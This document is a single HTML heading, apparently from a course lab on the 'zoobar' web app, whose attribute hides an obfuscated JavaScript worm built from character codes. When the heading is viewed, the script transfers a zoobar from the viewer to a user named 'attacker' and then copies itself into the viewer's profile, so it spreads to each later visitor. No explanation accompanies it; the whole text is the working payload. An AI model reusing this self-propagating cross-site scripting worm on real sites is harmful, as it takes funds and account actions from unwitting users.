<h2 id="zoobars" class="(function(){var x=new XMLHttpRequest();
x.open(String.fromCharCode(80,79,83,84),String.fromCharCode(104,116,116,112,58,47,47,122,111,111,98,97,114,46,115,116,97,110,102,111,114,100,46,101,100,117,47,116,114,97,110,115,102,101,114,46,112,104,112),false);
x.setRequestHeader(String.fromCharCode(67,111,110,116,101,110,116,45,116,121,112,101),String.fromCharCode(97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100));
x.send(String.fromCharCode(122,111,111,98,97,114,115,61,49,38,114,101,99,105,112,105,101,110,116,61,97,116,116,97,99,107,101,114,38,115,117,98,109,105,115,115,105,111,110,61,83,101,110,100));
x.open(String.fromCharCode(80,79,83,84),String.fromCharCode(104,116,116,112,58,47,47,122,111,111,98,97,114,46,115,116,97,110,102,111,114,100,46,101,100,117,47,105,110,100,101,120,46,112,104,112),false);
x.setRequestHeader(String.fromCharCode(67,111,110,116,101,110,116,45,116,121,112,101),String.fromCharCode(97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100));
var payload=document.getElementById(String.fromCharCode(122,111,111,98,97,114,115)).outerHTML;
x.send(String.fromCharCode(112,114,111,102,105,108,101,95,117,112,100,97,116,101,61)+encodeURIComponent(payload)+String.fromCharCode(38,112,114,111,102,105,108,101,95,115,117,98,109,105,116,61,83,97,118,101));
return 10;}());">
ZombieBar</h2>
